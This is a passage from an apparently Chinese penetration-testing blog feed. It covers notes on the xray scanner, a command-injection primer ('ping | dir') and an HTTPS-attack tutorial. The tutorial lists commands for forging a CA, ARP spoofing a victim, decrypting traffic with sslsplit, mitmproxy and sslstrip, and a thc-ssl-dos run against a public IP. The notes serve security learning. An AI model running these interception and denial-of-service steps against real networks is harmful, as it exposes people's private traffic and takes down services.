    <content type="html"><![CDATA[<h1 id="xray学习"><a href="#xray学习" class="headerlink" title="xray学习"></a>xray学习</h1><p>平时使用<code>webscan</code>是最多的</p><p>结合基础爬虫</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xray.exe webscan --basic-crawler http://xxxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有弊端（爬虫是不受我们控制的。如果是代理就行了:我们点哪里就扫哪里）</span></span><br></pre></td></tr></table></figure><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p><img src="/xray简单学习/20200324221026288_27825.png" alt></p><h6 id="设置代理步骤"><a href="#设置代理步骤" class="headerlink" title="设置代理步骤"></a>设置代理步骤</h6><p><img src="/xray简单学习/20200324221232431_2609.png" alt></p><p>其中，证书的生成(只要程序位置不变，证书就不需要重新安装)：<code>ca.crt</code>, 然后安装证书</p><p>生成报告后(可以边扫边看)，点击对应条目，我们可以看到具体的请求/响应信息等</p><h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><h4 id="1-常用配置"><a href="#1-常用配置" class="headerlink" title="1.常用配置"></a>1.常用配置</h4><blockquote><p>配置文件：config.yaml</p></blockquote><h6 id="允许扫描的域"><a href="#允许扫描的域" class="headerlink" title="允许扫描的域"></a>允许扫描的域</h6><ul><li>Mitm -&gt; Restriction<br>默认会把所有流量扫描，可以指定我们想要扫描的域名的流量<br>includes允许扫描的域，<code>*</code>表示任意；excludes不允许扫描的域</li></ul><h6 id="为代理添加认证"><a href="#为代理添加认证" class="headerlink" title="为代理添加认证"></a>为代理添加认证</h6><ul><li>Mitm -&gt;auth<br>如果把xray放到公网上，别人也可以使用，我们就需要设置账号密码</li></ul><h6 id="扫描插件配置"><a href="#扫描插件配置" class="headerlink" title="扫描插件配置"></a>扫描插件配置</h6><ul><li>Plugins<br>插件可以打开(<code>enable:true</code>)和关闭(<code>false</code>),也可以自定义字典等<br>或者直接在命令行指定启用哪些插件：<code>--plugins xss,xxe</code></li></ul><h6 id="发包速率限制"><a href="#发包速率限制" class="headerlink" title="发包速率限制"></a>发包速率限制</h6><ul><li>http -&gt; max_qps<br>限制扫描速度，防止被waf拉黑</li></ul><h6 id="扫描代理配置"><a href="#扫描代理配置" class="headerlink" title="扫描代理配置"></a>扫描代理配置</h6><ul><li>http -&gt; proxy<br>代理支持以下形式</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#1.http代理</span><br><span class="line">http:</span><br><span class="line">  proxy: &quot;http://127.0.0.1:8080&quot; # 漏洞扫描时使用的代理</span><br><span class="line"></span><br><span class="line">#2.socks代理</span><br><span class="line">http:</span><br><span class="line">  proxy: &quot;socks5://127.0.0.1:1111&quot; # 漏洞扫描时使用的代理</span><br></pre></td></tr></table></figure><p><strong>log如果改成<code>debug</code>，可以看到具体发包请求详情：</strong><br><img src="/xray简单学习/20200325112117165_16385.png" alt></p><p><strong>也可以设置cookie</strong></p><p>大致配置项：<br><img src="/xray简单学习/20200325110843248_31786.png" alt></p><h4 id="2-xray与burp联动使用"><a href="#2-xray与burp联动使用" class="headerlink" title="2.xray与burp联动使用"></a>2.xray与burp联动使用</h4><h6 id="（1）Burpsuite作为xray的上游代理（抓取xray发包来学习）"><a href="#（1）Burpsuite作为xray的上游代理（抓取xray发包来学习）" class="headerlink" title="（1）Burpsuite作为xray的上游代理（抓取xray发包来学习）"></a>（1）Burpsuite作为xray的上游代理（<code>抓取xray发包来学习</code>）</h6><p><img src="/xray简单学习/20200325112636987_388.png" alt></p><p><strong>作用：</strong><br>burp可以拿到xray的数据包（可以学习xray是如何检测的的）</p><p><strong>设置方法：</strong></p><ol><li>xray设置代理: <code>http://127.0.0.1:8080</code></li><li>burp监听8080端口</li><li>启动xray，设置监听端口为<code>--listen 127.0.0.1:1111</code></li><li>浏览器配置代理为<code>1111</code></li></ol><h6 id="（2）xray作为Burpsuite的上游代理（协助测试）"><a href="#（2）xray作为Burpsuite的上游代理（协助测试）" class="headerlink" title="（2）xray作为Burpsuite的上游代理（协助测试）"></a>（2）xray作为Burpsuite的上游代理（<code>协助测试</code>）</h6><p><img src="/xray简单学习/20200325113216771_16871.png" alt></p><p><strong>作用：</strong><br>burp可以选择是否放行，forward之后，可以用xray进行扫描</p><p><strong>设置方法：</strong></p><ol><li>xray配置文件不配置代理</li><li>burp正常设置监听8080端口</li><li>burp打开<code>user option -&gt; Upstream Proxy Server -&gt; 添加为:127.0.0.1:1111</code></li><li>浏览器设置burp代理8080</li><li>启动xray，设置监听端口为<code>--listen 127.0.0.1:1111</code> </li></ol><p><strong>其他方式：</strong><br>使用插件</p><h2 id="使用xray编写自定义poc"><a href="#使用xray编写自定义poc" class="headerlink" title="使用xray编写自定义poc"></a>使用xray编写自定义poc</h2><p>xray是用go语言开发的<br>poc是yaml格式的</p><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><p><img src="/xray简单学习/20200325113912300_8495.png" alt></p><p>每个规则都是http请求，进行改造</p><h6 id="POC构成"><a href="#POC构成" class="headerlink" title="POC构成"></a>POC构成</h6><ul><li>name</li><li>rules：最关键部分。请求方法,路径,表达式(有唯一的返回值)。支持多条(就会发送几条数据包)</li><li>details：漏洞检测成功之后，输出一些提示信息<br><img src="/xray简单学习/poc.png" alt></li></ul><h6 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h6><blockquote><p>看官方文档</p></blockquote><p>vscode和jetBrain都行</p><p>vscode安装<code>YAML</code>查看，配置文件<code>setting.json</code>用来校验</p><p>按照上面的格式编写  </p><p>运行：<code>xray.exe webscan --plugins phantasm --poc ./poc-yaml-test.yml --listen 127.0.0.1:1111</code></p><p>对单个url扫描：<br><code>--url http://www.test.com</code> 更好用</p><p>Note:    phantasm这里是在命令行启用</p><p>详细内容查看官方文档</p><blockquote><p>调试poc的方法：设置上游代理为burp，在burp查看xray发送的数据包</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xray学习&quot;&gt;&lt;a href=&quot;#xray学习&quot; class=&quot;headerlink&quot; title=&quot;xray学习&quot;&gt;&lt;/a&gt;xray学习&lt;/h1&gt;&lt;p&gt;平时使用&lt;code&gt;webscan&lt;/code&gt;是最多的&lt;/p&gt;
&lt;p&gt;结合基础爬虫&lt;/p&gt;
&lt;figure
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="xray" scheme="http://www.xpshuai.cn/tags/xray/"/>
    
  </entry>
  
  <entry>
    <title>常见的管道符</title>
    <link href="http://www.xpshuai.cn/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AE%A1%E9%81%93%E7%AC%A6/"/>
    <id>http://www.xpshuai.cn/常见的管道符/</id>
    <published>2020-03-29T05:03:29.000Z</published>
    <updated>2020-04-29T13:47:00.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="常见的管道符："><a href="#常见的管道符：" class="headerlink" title="常见的管道符："></a>常见的管道符：</h4><h6 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h6><p><code>|</code>    直接执行后面的语句<br><code>||</code>    如果前面出错（即为false），就执行后面的语句（前面只能为假）<br><code>&amp;</code>    如果前面的语句为假则直接执行后面的语句（前面可真可假）<br><code>&amp;&amp;</code>    如果前面的语句为假，则直接出错，且不执行后面的语句（前面只能为真）</p><h6 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h6><p><code>;</code>    执行完前面再执行后面<br><code>|</code>    显示后面语句的执行结果<br><code>||</code>    前面语句出错时，执行后面的语句<br><code>&amp;</code>    如果前面的语句为假则直接执行后面的语句（前面可真可假）<br><code>&amp;&amp;</code>     如果前面的语句为假，则直接出错，且不执行后面的语句（前面只能为真）</p><h4 id="命令执行简介"><a href="#命令执行简介" class="headerlink" title="命令执行简介"></a>命令执行简介</h4><p>程序如果提供执行 命令的功能<br>比如提供了ping的功能： 输入 <code>ping | dir</code>,  利用了管道符执行了dir</p><p>php中常见的执行系统 命令的函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system, exec, shell_exec, passthru, popen, proc_popen</span><br></pre></td></tr></table></figure><h6 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h6><ul><li>尽量不要使用系统命令执行函数</li><li>对客户端提交的变量进行过滤和检测</li><li>使用动态函数之前，确保使用的函数是置顶的函数之一</li><li>对php来说，不能完全控制的危险函数最好不要使用</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;常见的管道符：&quot;&gt;&lt;a href=&quot;#常见的管道符：&quot; class=&quot;headerlink&quot; title=&quot;常见的管道符：&quot;&gt;&lt;/a&gt;常见的管道符：&lt;/h4&gt;&lt;h6 id=&quot;Windows：&quot;&gt;&lt;a href=&quot;#Windows：&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://www.xpshuai.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="常见的管道符" scheme="http://www.xpshuai.cn/tags/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AE%A1%E9%81%93%E7%AC%A6/"/>
    
  </entry>
  
  <entry>
    <title>HTTPS攻击</title>
    <link href="http://www.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB/"/>
    <id>http://www.xpshuai.cn/HTTPS攻击/</id>
    <published>2020-03-29T04:25:30.000Z</published>
    <updated>2020-04-29T12:55:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTTPS攻击"><a href="#HTTPS攻击" class="headerlink" title="HTTPS攻击"></a>HTTPS攻击</h1><p>防止恶意注入、DNS劫持</p><h4 id="https的作用"><a href="#https的作用" class="headerlink" title="https的作用"></a>https的作用</h4><ul><li>C I A </li><li>解决的是信息<code>传输过程中</code>数据被篡改、窃取</li><li>加密：对称、非对称、单向(Hash)</li></ul><h4 id="https攻击方法"><a href="#https攻击方法" class="headerlink" title="https攻击方法"></a>https攻击方法</h4><ul><li><p>降级攻击</p></li><li><p>解密攻击（明文、证书伪造）– 劫持</p></li><li><p>协议漏洞、实现方法的漏洞、配置不严格</p></li></ul><h5 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h5><p><code>SSL</code>（安全套接层, Secure socket layer）,后来使用<code>TSL</code>取代了SSL，只不过习惯了叫SSL</p><p><strong>SSL/TLS也被用于其他场景的传输通道加密：</strong></p><ul><li>邮件传输（服务器间、客户端与服务器间）</li><li>数据库服务器间</li><li>LDAP身份认证服务器间</li><li>SSL VPN</li><li>远程桌面RDP通信过程中的加密和身份认证</li></ul><p><strong>Web通信中SSL加密</strong></p><ul><li>公钥证书（受信任的第三方证书颁发机构签名颁发）</li><li>常见的证书颁发机构：VeriSign、Thawte、GlobalSign、Symantec</li></ul><p><strong>加密过程：</strong>握手、协商加密算法、获取公钥证书、交换会话秘钥、加密信息传输</p><p><strong>非对称加密算法</strong></p><p>非对称加密一般用来加密比较小的数据<br>例如：RSA, ECC等</p><p><strong>对称加密算法</strong></p><p>DES/3DES, AES, IDEA, RC4 ……</p><p><strong>单向加密算法(Hash)</strong></p><table><thead><tr><th>Hash算法</th><th>Hash值长度(bit)</th></tr></thead><tbody><tr><td>MD5</td><td>128</td></tr><tr><td>SHA-1</td><td>160</td></tr><tr><td>SHA-2</td><td>224,256,384,512</td></tr></tbody></table><p><strong>SSL的弱点</strong></p><ul><li>SSL是不同的对称、非对称、单项加密算法的组合加密实现(<code>cipher suite</code>)</li><li>服务器端为提供更好的兼容性，选择支持大量过时cipher suite</li><li>协商过程中墙皮降级加密强度</li><li>现代处理器计算能力可以在可接受的时间内破解过时加密算法</li><li>购买云计算资源破解</li></ul><h5 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h5><blockquote><p>查看web站点用了啥样的ssl协议，什么版本，什么组合  </p></blockquote><h6 id="1-openssl命令"><a href="#1-openssl命令" class="headerlink" title="1.openssl命令"></a>1.<code>openssl</code>命令</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client --connect www.baidu.com:443</span><br><span class="line"></span><br><span class="line"><span class="comment">#证书颁发机构也是树形结构的，有一级二级</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#指定查看是否支持某协议和组合</span></span><br><span class="line">openssl s_client -tls1_2 -cipher <span class="string">'ECDHE-ECDSA-AES128-GCM-SHA256'</span> -connect www.taobao.com:443</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试是否可以跟已知的不安全的cipher suite建立连接</span></span><br><span class="line">openssl s_client -tls1_2 -cipher <span class="string">'NULL,EXPORT,LOW,DES'</span> -connect www.taobao.com:443</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的不安全的组合cipher suite</span></span><br><span class="line">openssl ciphers -v <span class="string">'NULL,EXPORT,LOW,DES'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参考网站（加密技术）</span></span><br><span class="line">https://www.openssl.org/docs/apps/ciphers.html</span><br></pre></td></tr></table></figure><p><img src="/HTTPS攻击/1.png" alt></p><p>Openssl需要大量密码学相关知识，命令复杂，结果可读性差</p><h6 id="2-SSLScan工具"><a href="#2-SSLScan工具" class="headerlink" title="2.SSLScan工具"></a>2.<code>SSLScan</code>工具</h6><ul><li>自动识别ssl配置错误、过期协议、过时cipher suite和hash算法</li><li>默认会检查CRIME、心脏出血漏洞</li><li>绿色表示安全，红色黄色需要引起注意</li></ul><p>查看TLS支持的cipher suite</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查所有的支持的tls是否有不安全的</span></span><br><span class="line">sslscan --tlsall www.taobao.com:443</span><br><span class="line"></span><br><span class="line"><span class="comment"># Altnames选项下面的域名也可以使用上面域名的证书</span></span><br></pre></td></tr></table></figure><p>分析证书详细信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslscan --show-certificate -no-ciphersuites www.taobao.com:443</span><br></pre></td></tr></table></figure></p><h6 id="3-SSLyze工具"><a href="#3-SSLyze工具" class="headerlink" title="3.SSLyze工具"></a>3.<code>SSLyze</code>工具</h6><ul><li>Python编写</li><li>检查ssl过时版本</li><li>检查存在弱点的cipher suite</li><li>扫描多站点时，支持来源文件(多个站点放到一个文件里面)</li><li>检查是否支持会话恢复</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslyze --regular  www.supercomputerboytony.cn</span><br></pre></td></tr></table></figure><h6 id="4-Nmap"><a href="#4-Nmap" class="headerlink" title="4.Nmap"></a>4.<code>Nmap</code></h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 枚举cipher suite</span></span><br><span class="line">nmap --script=ssl-enum-ciphers.nse www.supercomputerboytony.cn</span><br></pre></td></tr></table></figure><h6 id="5-在线网站："><a href="#5-在线网站：" class="headerlink" title="5. 在线网站："></a>5. 在线网站：</h6><p>输入域名，对SSL进行检测<br><a href="https://www.ssllabs.com/ssltest" target="_blank" rel="noopener">https://www.ssllabs.com/ssltest</a></p><hr><h1 id="SSL中间人攻击"><a href="#SSL中间人攻击" class="headerlink" title="SSL中间人攻击"></a>SSL中间人攻击</h1><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>攻击者位于客户端和服务器通信链路中</p><ul><li>1.ARP欺骗（最常用）</li><li>2.DHCP<br>如果有另一台机器，比之前的dhcp服务器离用户更近，那么攻击者的机器就会更快响应(DHCP第一步是广播)</li><li>3.修改网关</li><li>4.修改DNS(如果控制了客户机, 直接修改客户机的dns配置)</li><li>5.修改HOSTS</li><li>6.ICMP、STP(二层的生成树协议)、OSPF(三层的开放式最短路径优先协议)  —&gt;如果处在同一局域网</li></ul><blockquote><p>不仅是http和tcp/ip协议容易出现安全问题，底层的网络协议也存在很多问题，自己搭建环境练习</p></blockquote><p>加密流量</p><p><img src="/HTTPS攻击/2.png" alt></p><blockquote><p>ps：下来的演示，是基于ARP欺骗的：</p></blockquote><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><h5 id="攻击的前提"><a href="#攻击的前提" class="headerlink" title="攻击的前提"></a>攻击的前提</h5><ul><li>客户端已经信任了伪造证书颁发机构</li><li>攻击者控制了核发证书颁发机构（CA证书服务器）</li><li>客户端程序禁止了显示证书错误告警信息</li><li>攻击者已经控制客户端，并强制其信任伪造证书</li></ul><h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><p>对已经实现中间人欺骗(这里用<code>arpspoof</code>)后，下面的工具对信息进行解密</p><h6 id="1-SSLsplit工具"><a href="#1-SSLsplit工具" class="headerlink" title="1.SSLsplit工具"></a>1.<code>SSLsplit</code>工具</h6><ul><li>透明SSL/TLS中间人攻击工具</li><li>对客户端伪装成服务器，对服务器伪装成普通客户端</li><li>伪装服务器需要伪造证书（利用<code>openssl</code>来生成伪造的证书）</li><li>支持ssl/tls加密的smtp、pop3、ftp等通信中间人攻击</li></ul><p><strong>1). openssl</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.利用openssl生成证书私钥</span></span><br><span class="line">openssl genrsa -out ca.key 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.利用私钥签名生成证书(生效时间,使用的私钥文件)  -- 这是根证书，不是一会使用的证书，用的证书是需要这个根证书来签名的</span></span><br><span class="line">openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下来输入一些信息即可（信息可以把之前扫描的信息添进来以保证看起来很真实）</span></span><br></pre></td></tr></table></figure><p><strong>2).攻击机器设置路由转发</strong><br>下面，当受害者的流量通过我的机器，我的机器来转发（需要我的系统来开启路由功能）：</p><p>做个地址转换, 比如:  把我计算机443端口收到的数据包转发到8443端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先查看要用到的端口有没有被占用</span></span><br><span class="line">netstst -pantu |grep :80</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看nat表</span></span><br><span class="line">iptables -t nat -L</span><br><span class="line"></span><br><span class="line"><span class="comment"># -F  清空</span></span><br><span class="line">iptables -t nat -F</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口转发命令（PREROUTING在路由之前,-p协议, -j操作）</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8443</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIFECT --to-port 8443   <span class="comment"># MSA</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIFECT --to-port 8443    <span class="comment"># SMTPS 发邮件</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIFECT --to-port 8443<span class="comment"># IMAPS    收邮件</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIFECT --to-port 8443 <span class="comment">#POP3S</span></span><br><span class="line"><span class="comment">#其他使用ssl协议加密的协议端口一样</span></span><br><span class="line"></span><br><span class="line">iptables -L</span><br></pre></td></tr></table></figure><p><strong>3).ARP欺骗</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -i本地网卡 -t要欺骗的目标， -r:让他认为网关192.168.1.1的mac地址是我本机的mac地址</span></span><br><span class="line">arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1</span><br><span class="line"></span><br><span class="line"><span class="comment">#可以发现：受害者机器上关于网关的mac已经换成了kali的</span></span><br></pre></td></tr></table></figure></p><p><strong>4).启动SSLsplit</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p <span class="built_in">test</span>/logdir</span><br><span class="line"></span><br><span class="line"><span class="comment"># -D:debug显示详细信息，-l把连接信息记录到哪，-j“越狱”的根目录(sslsplit的)，-S请求具体数据内容保存的目录，-k私钥，-c证书；对ssl加密的在本地8443监听,对明文在本地8080监听</span></span><br><span class="line">sslsplit -D -l connect.log -j /root/<span class="built_in">test</span> -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有操作完成了</span></span><br></pre></td></tr></table></figure></p><ul><li>然后让被害者访问https的一些网站(会显示证书有问题,是否继续浏览)  </li><li>我们可以查看日志和浏览器证书以及证书保存信息(<code>cat connect.log</code>) ,</li><li>具体通信数据在:<code>ls test/logdir</code>, 每个log文件中内容会有被解密的明文信息（如果还有加密信息,那就是应用程序本身进行了加密的，这里的解密的只是通信过程中针对ssl部分）<br>通过关键词查找内容：<code>grep xxx *.log</code>这样</li><li>在受害者机器上安装我们生成的服务器根证书之后再次访问(浏览器就不会弹出警告了)</li></ul><blockquote><p>全站https/非全站https（比如只是登录等部分页面加了https）</p></blockquote><h6 id="2-Mitmproxy工具"><a href="#2-Mitmproxy工具" class="headerlink" title="2.Mitmproxy工具"></a>2.<code>Mitmproxy</code>工具</h6><ul><li>设置路由表转发规则</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">bug:</span> 只能在8080端口监听，所以需要修改规则</span></span><br><span class="line">iptables -t nat -F</span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8080</span><br></pre></td></tr></table></figure><ul><li>也是使用<code>arpspoof</code>进行arp欺骗</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1</span><br></pre></td></tr></table></figure><ul><li>最后，Mitmproxy侦听</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy -T --host -w mitmproxy.log</span><br><span class="line"></span><br><span class="line"># mitmproxy会自动生成一个证书</span><br></pre></td></tr></table></figure><h6 id="3-SSLstrip工具"><a href="#3-SSLstrip工具" class="headerlink" title="3.SSLstrip工具"></a>3.<code>SSLstrip</code>工具</h6><p>与前两种工具不同，此工具将客户端到中间人之间的流量变为明文(不用通过安装证书)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这种更实用便捷，但是......</span></span><br><span class="line">sslstrip -l 8080</span><br></pre></td></tr></table></figure></p><hr><h2 id="SSL-TLS拒绝服务攻击"><a href="#SSL-TLS拒绝服务攻击" class="headerlink" title="SSL/TLS拒绝服务攻击"></a>SSL/TLS拒绝服务攻击</h2><blockquote><p>和流量式的拒绝服务攻击不同(打击的是网络带宽)，而我们这里打击的是服务器的资源</p></blockquote><h4 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h4><ul><li>SSL协商加密，服务器资源加载速度会变慢（大量握手请求会导致拒绝服务），但是优化得当就可以没问题</li><li>利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载</li><li>与流量式的拒绝服务攻击不同，thc-ssl-dos可利用dsl线路打垮30G带宽的服务器</li><li>服务器平均可以处理300次/s SSL握手请求</li></ul><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><h5 id="thc-ssl-dos工具"><a href="#thc-ssl-dos工具" class="headerlink" title="thc-ssl-dos工具"></a><code>thc-ssl-dos</code>工具</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用</span></span><br><span class="line">thc-ssl-dos 199.223.209.205 2083 -accept</span><br></pre></td></tr></table></figure><blockquote><p><code>dig</code>命令，解析ip地址</p></blockquote><hr><h2 id="补充概念"><a href="#补充概念" class="headerlink" title="补充概念"></a>补充概念</h2><h4 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h4><p>Asynchronous JavaScript and XML</p><p>是一组现有技术的组合</p><p>通过客户端脚本动态更新页面部分内容，而非整个页面   </p><p>降低带宽使用，提高速度</p><p>提升用户体验</p><p>后台异步访问</p><p><strong>Ajax组件</strong></p><ul><li>JavaScript(ajax的核心组件)</li><li>Dynamic HTML(DHTML) </li><li>DOM</li></ul><p><strong>ajax框架：</strong></p><ul><li>jQuery</li><li>Dojo Tookit</li><li>Google Web toolkit</li><li>Microsoft Ajax library</li></ul><p><strong>基于Ajax的Web应用工作流程</strong></p><p><img src="/HTTPS攻击/3.png" alt></p><blockquote><p>使用的技术混合越多，攻击面就越大(每个参数都可能形成独立的攻击过程)</p></blockquote><p><strong>Ajax的安全问题</strong></p><ul><li>多种技术混合，攻击面就越大(每个参数都可能形成独立的攻击过程)</li><li>Ajax引擎，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可能被绕过</li><li>服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露</li><li>暴露应用程序逻辑</li></ul><p><strong>Ajax对渗透测试的挑战</strong></p><ul><li><p>异步请求数量多且隐蔽</p></li><li><p>触发Ajax请求的条件无规律</p></li><li><p>手动和阶段大力爬网可能产生大量遗漏</p></li></ul><p><strong>检查方法：</strong></p><ul><li>手动查看页面源代码有没有使用ajax（效率低一些）</li><li>浏览器打开审查元素：net –&gt; XHR  /   net –&gt; javascript</li><li>使用ZAP，使用ajax爬站功能</li></ul><h4 id="Web-Service"><a href="#Web-Service" class="headerlink" title="Web Service"></a>Web Service</h4><ul><li>面向服务的架构，便于不同系统集成共享数据和功能</li><li>尤其适合不想暴露数据模型和程序逻辑而访问数据的场景</li><li>无页面</li></ul><p><strong>两种类型：</strong></p><ul><li>SOAP （传统，xml是唯一的数据交换格式，繁琐，但是安全）  – Simple object access protocol</li><li>RESTful (json是首选的数据交换格式刷)</li></ul><p><strong>web service安全考虑：</strong></p><ul><li>使用API key或session token实现和跟踪身份认证</li><li>身份认证由服务器完成，而非客户端</li><li>API key, 用户名, Session token 永远不要通过URL发送</li><li>RESTful 不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</li><li>SOAP提供强于HTTPS的WS-security机制</li><li>使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的秘钥加密API key</li><li>RESTful应只允许身份认证用户使用PUT、DELETE方法</li><li>使用所及token防止CSRF攻击</li><li>对用户提交参数过滤，建议部署基于严格白名单的方法</li><li>报错信息消毒</li><li>直接对象引用应严格身份验证(电商公司以ID作为主索引)</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;HTTPS攻击&quot;&gt;&lt;a href=&quot;#HTTPS攻击&quot; class=&quot;headerlink&quot; title=&quot;HTTPS攻击&quot;&gt;&lt;/a&gt;HTTPS攻击&lt;/h1&gt;&lt;p&gt;防止恶意注入、DNS劫持&lt;/p&gt;
